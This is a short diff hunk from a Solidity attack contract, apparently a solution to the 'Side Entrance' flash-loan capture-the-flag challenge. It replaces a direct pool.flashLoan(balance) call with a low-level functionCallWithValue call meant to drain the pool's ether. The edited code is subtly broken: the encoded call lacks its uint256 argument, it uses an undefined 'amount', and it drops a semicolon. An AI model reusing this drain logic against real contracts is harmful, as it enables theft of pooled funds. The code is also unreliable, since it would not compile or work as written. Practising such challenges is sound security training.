@@ -23,12 +23,15 @@ contract SideEntraceAttack {
                ) 
     {
         attacker = attackerAddress;
-        pool = IPoolFunc(poolAddress);
+        pool = address(poolAddress);
         balance = address(poolAddress).balance;
         console.log("Starting flashloan %s",balance);
-        pool.flashLoan(
-                balance
-            );
+        pool.functionCallWithValue(
+            abi.encodeWithSignature(
+                "flashLoan(uint256)"
+            ),
+            amount
+        )
         
         console.log("Flashloan complete %s", token.balanceOf(address(this)));
         
